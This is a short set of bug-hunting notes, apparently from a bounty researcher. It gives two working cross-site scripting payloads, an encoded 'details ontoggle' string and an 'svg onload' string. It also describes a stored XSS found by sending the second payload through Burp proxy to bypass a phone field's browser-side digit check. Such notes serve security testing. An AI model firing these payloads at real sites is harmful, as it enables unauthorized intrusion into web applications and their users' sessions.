---------------------------------------------
xss Payloads:
<details++on+/ontoggle%3d1%5econfirm(document.domain)+open//

Test multiple XSS scenarios with ONE payload.  

https://pastebin.com/4zADMK1u
-----------------------------------------------
Bug: Stored XSS 

Tried to input XSS payload through proxy.

Phone Number Field-
Through Browser: Only Numeric Digits allowed (Alphabet and Special Characters Blocked)

Through Burp Proxy: 123"><svg+onload=prompt(document.domain)> (Stored XSS)
---------------------------------------------------------
